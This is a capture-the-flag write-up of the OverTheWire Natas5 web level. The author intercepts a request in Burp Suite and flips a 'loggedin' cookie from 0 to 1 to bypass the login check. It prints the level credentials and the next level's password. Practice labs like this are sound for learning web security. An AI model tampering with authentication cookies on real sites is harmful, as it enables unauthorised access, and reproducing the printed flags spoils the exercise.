# CTF Writeup - **OverTheWire Natas4 - Natas5**

**Author**: spiketyson 

---

## Challenge Details

- **Challenge Name:** Natas4 - Natas5
- **Category:** Linux
- **Difficulty Level:** Easy
- **Date:** 1-12-2024

---

## Summary

This challenge is the introductory level for the Natas series on OverTheWire, focusing on web exploitation. The goal is to find the flag that is hidden web server using burpsuite.

---

## Approach

Since this is an basic challenge, I planned to use burp suite for this challenge in order to manipulate the request sent to the server.

---

## Solution Walkthrough

Connecting to the web server using:

```bash
Username: natas5
Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
URL:      http://natas5.natas.labs.overthewire.org
```

After logging in, we can see that the webpage says `Access disallowed. You are not logged in`.  It is saying that we are not logged in but we just logged in right. Lets see the request using burpsuite and modify it.

```bash
# GET / HTTP/1.1
# Host: natas5.natas.labs.overthewire.org
# Cache-Control: max-age=0
# Authorization: Basic bmF0YXM1OjBuMzVQa2dnQVBtMnpiRXBPVTgwMmMweDBNc24xVG9L
# Accept-Language: en-US,en;q=0.9
# Upgrade-Insecure-Requests: 1
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
# Accept-Encoding: gzip, deflate, br
# Cookie: loggedin=0
# Connection: keep-alive
```

The above is the request that got captured while sending it to the server. We can see that there is a flag called `loggedin` which is set to `0`.  Now lets try to change it to `1` to see if we can get any information after logging in. We can see that it gives as the password for the next level.

```bash
# Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```

## Flag

**Flag:** 0RoJwHdSKWFTYR5WuiAewauSuNaBXned

---

## Lessons Learned

It was a good challenge where i learned about what burp suite is and how to work with them to capture request and modify it.
